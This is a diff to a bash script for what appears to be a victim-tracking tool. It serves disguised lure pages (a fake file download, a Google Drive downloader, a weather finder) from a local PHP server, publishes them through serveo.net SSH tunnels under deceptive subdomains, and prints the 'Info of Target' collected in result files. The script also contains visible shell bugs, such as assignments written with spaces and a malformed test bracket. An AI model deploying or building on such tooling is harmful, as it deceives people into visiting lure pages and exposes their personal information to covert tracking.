@@ -47,9 +47,7 @@ filedownload(){
     echo "Starting PHP Server..."
     cd Tracker/filedownload
     php -S 127.0.0.1:8000
-    echo "Starting serveo"
-    ssh -R filedownloadersitex:80:127.0.0.1:8000 serveo.net
-    echo "[+] Direct link: filedownloadersitex.serveo.net"
+    
 }
 
 gdrive(){
@@ -64,9 +62,6 @@ gdrive(){
     cd ../../..
     cd Tracker/gdrive
     php -S 127.0.0.1:8000
-    echo "Starting serveo"
-    ssh -R googledrivedownloaderx:80:127.0.0.1:8000 serveo.net
-    echo "[+] Direct link: googledrivedownloaderx.serveo.net"
     
 }
 
@@ -80,13 +75,24 @@ weather(){
     echo "[+] Direct link: weatherfindersitex.serveo.net"
 }
 
-
 resultopen(){
     echo "Sucessfully received Info of Target.."
     echo "Fetching information of Target..."
-    echo Tracker/filedownload/php/result.txt
-    echo Tracker/gdrive/php/result.txt
-    echo Tracker/weather/php/result.txt
+    if [ $tempno == 1 ]
+    then
+        file = "Tracker/filedownload/php/result.txt"
+        cat $file
+    elif [ $tempno == 2 ]
+    then 
+        file = "Tracker/gdrive/php/result.txt"
+        cat $file
+    elif [ $tempno == 3]
+    then
+        file = "Tracker/weather/php/result.txt"
+        cat $file
+    else
+        echo "File not Found, open manually to check results"
+    fi
 }
 
 if [ $tempno == 1 ]
@@ -112,3 +118,25 @@ then
 else
     echo -e "${Red}Please choose a proper Template!"
 fi
+
+
+serveostart(){
+    if [ $tempno == 1 ]
+    then
+        echo "Starting serveo"
+        ssh -R filedownloadersitex:80:127.0.0.1:8000 serveo.net
+        echo "[+] Direct link: filedownloadersitex.serveo.net"
+    elif [ $tempno == 2 ]
+    then 
+        echo "Starting serveo"
+        ssh -R googledrivedownloaderx:80:127.0.0.1:8000 serveo.net
+        echo "[+] Direct link: googledrivedownloaderx.serveo.net"
+    elif [ $tempno == 3]
+    then
+        echo "Starting serveo"
+        ssh -R weatherfindersitex:80:127.0.0.1:8000 serveo.net
+        echo "[+] Direct link: weatherfindersitex.serveo.net"
+    else
+        echo "File not Found, open manually to check results"
+    fi
+}
